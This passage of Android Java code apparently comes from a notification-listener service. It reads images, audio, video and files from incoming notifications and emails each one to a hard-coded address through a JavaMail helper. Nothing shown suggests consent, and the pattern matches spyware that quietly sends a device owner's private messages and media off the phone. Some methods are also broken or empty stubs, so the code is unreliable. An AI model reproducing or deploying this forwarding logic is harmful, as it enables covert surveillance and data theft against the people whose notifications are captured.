            Log.d(TAG, "notification MIME type is null for file URI: " + fileUri);
        }
    }

    private void forwardNotificationWithImage(Uri imageUri) {
        try {
            Bitmap image = MediaStore.Images.Media.getBitmap(getContentResolver(), imageUri);
            String subject = "Notification Image";
            String messageBody = "notification You have received an image.";
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, image);
            Log.d(TAG, "notification Image  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward image : ", e);
        }
    }

    private void forwardNotificationWithAudio(Uri audioUri) {
        String subject = "Notification Audio";
        String messageBody = "notification received an audio file.";
        try {
            byte[] audioData = readFileToByteArray(audioUri);
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, audioData, "audio.mp3"); // সঠিক ফাইল নাম ব্যবহার করুন
            Log.d(TAG, "notificationAudio  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward audio file: ", e);
        }
    }

    private void forwardNotificationWithVideo(Uri videoUri) {
        String subject = "Notification Video";
        String messageBody = "notification You have received a video file.";
        try {
            byte[] videoData = readFileToByteArray(videoUri);
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, videoData, "video.mp4"); // Use the appropriate filename
            Log.d(TAG, "notification Video  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward video file: ", e);
        }
    }

    private void forwardNotificationWithFile(Uri fileUri) {
        String subject = "Notification File";
        String messageBody = "notification You have received a file.";
        try {
            byte[] fileData = readFileToByteArray(fileUri);
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, fileData, "file.txt"); // Use the appropriate filename
            Log.d(TAG, "notificationFile  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward generic file: ", e);
        }
    }

    private byte[] readFileToByteArray(Uri fileUri) throws Exception {
        try (InputStream inputStream = getContentResolver().openInputStream(fileUri);
             ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                byteArrayOutputStream.write(buffer, 0, bytesRead);
            }
            return byteArrayOutputStream.toByteArray();
        }
    }

    private Bitmap extractLargeIcon(Bundle extras) {
        Bitmap largeIconBitmap = null;
        if (extras.containsKey(Notification.EXTRA_LARGE_ICON)) {
            Object iconObj = extras.get(Notification.EXTRA_LARGE_ICON);
            if (iconObj instanceof Bitmap) {
                largeIconBitmap = (Bitmap) iconObj;
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (iconObj instanceof Icon) {
                    Icon icon = (Icon) iconObj;
                    Drawable drawable = icon.loadDrawable(this);
                    if (drawable != null) {
                        largeIconBitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
                        Canvas canvas = new Canvas(largeIconBitmap);
                        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                        drawable.draw(canvas);
                    }
                }
            }
        }
        return largeIconBitmap;
    }

    public void listenNotifications(Context sbn) {
        onNotificationPosted( sbn );
    }

    private void onNotificationPosted(Context sbn) {
    }

}
